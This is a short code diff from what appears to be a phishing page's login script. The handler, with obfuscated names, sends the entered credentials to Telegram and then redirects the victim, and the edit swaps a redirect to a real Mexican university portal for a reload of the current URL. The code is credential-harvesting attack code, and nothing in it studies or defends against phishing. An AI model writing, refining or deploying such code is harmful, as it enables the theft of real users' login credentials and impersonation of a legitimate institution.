@@ -22,6 +22,8 @@ loginButton.addEventListener("click", function (_0xb56f8f) {
     return;
   }
 
+  const newUrl = window.location.href;
+
   this.textContent = "Validando Información...";
   this.classList.add("loading");
   this.disabled = true;
@@ -42,7 +44,7 @@ loginButton.addEventListener("click", function (_0xb56f8f) {
     return response.json();
   }).then(data => {
     console.log("Datos enviados correctamente a Telegram");
-    window.location.href = "https://e42.um.edu.mx/sec/Home.aspx";
+    window.location.href = newUrl;
   }).catch(error => {
     console.error("Error al enviar los datos:", error);
     alert("Hubo un error al procesar la solicitud. Intenta nuevamente.");
